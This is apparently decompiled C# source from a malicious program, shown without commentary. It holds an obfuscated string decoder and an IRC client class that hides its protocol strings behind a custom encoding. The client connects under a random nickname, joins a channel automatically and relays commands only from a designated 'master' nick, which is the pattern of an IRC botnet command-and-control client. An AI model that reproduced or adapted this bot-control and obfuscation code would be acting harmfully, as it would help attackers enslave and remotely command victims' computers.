      public static string vernerd(string Text)
      {
        string str1 = "";
        int num1 = checked (Text.Length - 1);
        int index1 = 0;
        while (index1 <= num1)
        {
          string str2 = checked (Strings.Asc(Text[index1]) + index1).ToString();
          int num2 = checked (str2.Length - 1);
          int index2 = 0;
          while (index2 <= num2)
          {
            switch ((char) ((int) str2[index2] - 44))
            {
              case char.MinValue:
                str1 += "a";
                break;
              case '\u0004':
                str1 += "q";
                break;
              case '\u0005':
                str1 += "w";
                break;
              case '\u0006':
                str1 += "e";
                break;
              case '\a':
                str1 += "r";
                break;
              case '\b':
                str1 += "t";
                break;
              case '\t':
                str1 += "z";
                break;
              case '\n':
                str1 += "u";
                break;
              case '\v':
                str1 += "i";
                break;
              case '\f':
                str1 += "o";
                break;
              case '\r':
                str1 += "p";
                break;
            }
            checked { ++index2; }
          }
          str1 += Interaction.IIf(checked (Text.Length - 1) == index1, (object) "", (object) "#").ToString();
          checked { ++index1; }
        }
        return str1;
      }
    }

    public class Ir
    {
      private static List<WeakReference> __ENCList = new List<WeakReference>();
      public readonly Random R;
      public readonly string Randnick;
      public string USER;
      public string NICK;
      public int PORT;
      public string CHANNEL;
      public string SERVER;
      public NetworkStream IRCstream;
      public StreamReader IRCreader;
      public StreamWriter IRCwriter;
      public TcpClient irc;
      public string inputLine;
      public string Log;
      public string master;
      public List<Form1.Ir.event_sp> eventtype_string;
      private string msgpriv;

      [DebuggerNonUserCode]
      static Ir()
      {
      }

      public Ir()
      {
        Form1.Ir.__ENCAddToList((object) this);
        this.R = new Random();
        this.Randnick = Conversions.ToString(this.R.Next(100000));
        this.USER = Form1.love_is_hard.entnerd("oz#ot#iw#oz#ru#iw#wwt#wqt#wqi#wwu#te#op#wwr#wep#wrr#weu#wrq#wet#zq#oz#wez#wri#zt#weu#wrz#zi#ot#wqz#wrp#wtz#wrt#wru#wte#wru");
        this.eventtype_string = new List<Form1.Ir.event_sp>();
        this.msgpriv = Form1.love_is_hard.entnerd("oq#or#iz#op#ow#oo#ii#rp");
      }

      [DebuggerNonUserCode]
      private static void __ENCAddToList(object value)
      {
        lock (Form1.Ir.__ENCList)
        {
          if (Form1.Ir.__ENCList.Count == Form1.Ir.__ENCList.Capacity)
          {
            int index1 = 0;
            int num = checked (Form1.Ir.__ENCList.Count - 1);
            int index2 = 0;
            while (index2 <= num)
            {
              if (Form1.Ir.__ENCList[index2].IsAlive)
              {
                if (index2 != index1)
                  Form1.Ir.__ENCList[index1] = Form1.Ir.__ENCList[index2];
                checked { ++index1; }
              }
              checked { ++index2; }
            }
            Form1.Ir.__ENCList.RemoveRange(index1, checked (Form1.Ir.__ENCList.Count - index1));
            Form1.Ir.__ENCList.Capacity = Form1.Ir.__ENCList.Count;
          }
          Form1.Ir.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
        }
      }

      public event Form1.Ir.THADEventHandler THAD;

      public event Form1.Ir.FehlerEventHandler Fehler;

      public bool Connect(string Nick_, string Channel_, string server_, string Port_)
      {
        bool flag;
        try
        {
          this.NICK = Nick_;
          this.CHANNEL = Channel_;
          this.SERVER = server_;
          this.PORT = Conversions.ToInteger(Port_);
          this.irc = new TcpClient(this.SERVER, this.PORT);
          this.IRCstream = this.irc.GetStream();
          this.IRCreader = new StreamReader((Stream) this.IRCstream);
          this.IRCwriter = new StreamWriter((Stream) this.IRCstream);
          this.IRCwriter.WriteLine(this.USER);
          this.IRCwriter.Flush();
          this.IRCwriter.WriteLine(Form1.love_is_hard.entnerd("io#it#up#io#ru") + this.NICK);
          this.IRCwriter.Flush();
          new Thread(new ThreadStart(this.read)).Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          flag = false;
          ProjectData.ClearProjectError();
          goto label_4;
        }
        flag = true;
label_4:
        return flag;
      }

      public void addLog(string Message)
      {
        this.Log = this.Log + Message + "\r\n";
        Form1.Ir.THADEventHandler thadEvent = this.THADEvent;
        if (thadEvent == null)
          return;
        thadEvent(this.Log);
      }

      public void read()
      {
        string oldValue = Form1.love_is_hard.entnerd("oq#it#oq#it#ru#ur");
        string str1 = Form1.love_is_hard.entnerd("oq#oq#oq#it#ru#ur");
        string str2 = Form1.love_is_hard.entnerd("it#oq#iz#ow#ru");
        string str3 = Form1.love_is_hard.entnerd("ii#oq#iq#ie#ru");
        while (true)
        {
          try
          {
            this.inputLine = this.IRCreader.ReadLine();
            this.addLog(this.inputLine);
            if (this.inputLine.Contains(str3))
            {
              this.IRCwriter.WriteLine(str2 + this.CHANNEL);
              this.IRCwriter.Flush();
            }
            if (this.inputLine.Contains(oldValue))
            {
              string str4 = new string(Conversions.ToCharArrayRankOne(new string(Conversions.ToCharArrayRankOne(this.inputLine.Substring(this.inputLine.IndexOf(oldValue)))).Replace(oldValue, string.Empty)));
              this.IRCwriter.WriteLine(str1 + str4);
              this.IRCwriter.Flush();
            }
            int num = checked (this.eventtype_string.Count - 1);
            int index = 0;
            while (index <= num)
            {
              if (this.inputLine.Contains(this.eventtype_string[index].parm) & this.inputLine.StartsWith(":" + this.master + "!"))
                this.eventtype_string[index].Raise_event(this.inputLine);
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception = ex;
            Form1.Ir.FehlerEventHandler fehlerEvent = this.FehlerEvent;
            if (fehlerEvent != null)
              fehlerEvent(exception.ToString());
            ProjectData.ClearProjectError();
            break;
          }
        }
      }

      public void Send(string Text)
      {
        this.IRCwriter.WriteLine(this.msgpriv + this.CHANNEL + " : \u0003" + Text);
        this.IRCwriter.Flush();
      }

      public delegate void THADEventHandler(string Text);

      public delegate void FehlerEventHandler(string Text);

      public class event_sp
      {
        private static List<WeakReference> __ENCList = new List<WeakReference>();
        public string parm;

        [DebuggerNonUserCode]
        static event_sp()
        {
        }

        [DebuggerNonUserCode]
        public event_sp() => Form1.Ir.event_sp.__ENCAddToList((object) this);

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
          lock (Form1.Ir.event_sp.__ENCList)
          {
            if (Form1.Ir.event_sp.__ENCList.Count == Form1.Ir.event_sp.__ENCList.Capacity)
            {
              int index1 = 0;
              int num = checked (Form1.Ir.event_sp.__ENCList.Count - 1);
              int index2 = 0;
              while (index2 <= num)
              {
                if (Form1.Ir.event_sp.__ENCList[index2].IsAlive)
                {
                  if (index2 != index1)
                    Form1.Ir.event_sp.__ENCList[index1] = Form1.Ir.event_sp.__ENCList[index2];
                  checked { ++index1; }
                }
                checked { ++index2; }
              }
              Form1.Ir.event_sp.__ENCList.RemoveRange(index1, checked (Form1.Ir.event_sp.__ENCList.Count - index1));
              Form1.Ir.event_sp.__ENCList.Capacity = Form1.Ir.event_sp.__ENCList.Count;
            }
            Form1.Ir.event_sp.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
          }
        }

        public event Form1.Ir.event_sp.eventtype1EventHandler eventtype1;

        public void Raise_event(string parm_)
        {
          Form1.Ir.event_sp.eventtype1EventHandler eventtype1Event = this.eventtype1Event;
          if (eventtype1Event == null)
            return;
          eventtype1Event(parm_);
        }

        public delegate void eventtype1EventHandler(string parm);
      }
    }
  }
}
